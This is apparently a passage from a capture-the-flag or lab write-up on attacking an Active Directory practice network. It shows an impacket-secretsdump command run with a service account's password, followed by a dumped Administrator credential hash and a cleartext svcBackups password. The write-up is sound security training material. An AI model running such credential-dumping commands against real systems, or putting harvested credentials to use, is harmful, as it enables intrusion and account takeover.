
## With svcScanning user
Service accounts have more privileges than normal domain users. With the `svcScanning` account, we can carry out further attacks such as dumping secrets from the AD machines.

### Dump hashes on the `Server1` machine

$ `proxychains4 -q /usr/bin/impacket-secretsdump corp.thereserve.loc/svcScanning:'Password1!'@10.200.113.31`


![](https://lh7-us.googleusercontent.com/docsz/AD_4nXfFUB-EHaHwLam5KaYc9wRAYfVazfbOtAfZS3uUL6YxF4VlKk9hJlURi8ffJQkbx2xpP4ePSOWk42DVC2apfEWeHsyo6eZfpFl4VnMeNt7vUn3L16-K7HQCdZFELpK8-_cK1z69q57NWibfcfHlT3q1_Ot8?key=RYwlcatSjtv71wwEi5xjfQ)


#### Interesting discoveries

> There are a couple of things from this output that are of most interest.

- The Administrator’s NTLM hash.
	- <font color="#00b050">CORP.THERESERVE.LOC/Administrator</font>
	- $DCC2$10240#Administrator#b08785ec00370a4f7d02ef8bd9b798ca
- The ClearText password for `svcBackups` account.
	- <font color="#00b050">svcBackups@corp.thereserve.loc:</font>
	- q9nzssaFtGHdqUV3Qv6G


**Next step:** [[Dumping secrets from CORPDC]]
